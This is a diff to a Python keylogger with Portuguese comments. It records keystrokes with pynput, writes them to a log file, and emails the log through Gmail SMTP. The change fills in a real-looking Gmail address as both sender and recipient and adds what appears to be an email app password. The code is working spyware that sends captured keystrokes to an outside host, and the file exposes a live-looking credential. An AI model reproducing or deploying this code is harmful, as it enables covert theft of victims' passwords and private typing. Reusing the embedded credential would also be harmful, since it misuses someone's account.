@@ -20,14 +20,21 @@ def write_file(keys):
     with open("log.txt", "a") as f:
         for key in keys:
             k = str(key).replace("'", "")
-            if k.find("space") > 0:
-                f.write(' ')
+            if k.find("backspace") > 0:
+                f.write('*')
             elif k.find("Key") == -1:
                 f.write(k)
+            elif k.find("tab") > 0:
+                f.write('tab')
+            #se apagar com backspace Mmostra oq foi apagado com *
+            elif k.find("space") > 0:
+                f.write('  ')
 
+            
 def on_release(key):
     if key == Key.enter:
         return False
+
 
 def main():
     try:
@@ -60,18 +67,17 @@ while i < 100:
     #captura as teclas pressionadas e guarda em um arquivo e depois de 60 segundos sai do loop
     with Listener(on_press=on_press, on_release=on_release) as listener:
      listener.join()
-
-     time.sleep(10)
+    write_file(keys)
 
     smtp_port = 587
     smtp_server = "smtp.gmail.com"
 
     message = open("log.txt", "r").read()
 
-    email_from = "#" #email que ira enviar a mensagem configurado
-    email_to = "#" #email que ira receber a mensagem
+    email_from = "sensteveoo7@gmail.com" #email que ira enviar a mensagem configurado
+    email_to = "sensteveoo7@gmail.com" #email que ira receber a mensagem
 
-    pswd = "qopaibkecawlqjzn"# CODIGO DE ACESSO DO EMAIL
+    pswd = "wltsqjhpskjmerrj"# CODIGO DE ACESSO DO EMAIL
 
 
     simple_email_context = ssl.create_default_context()
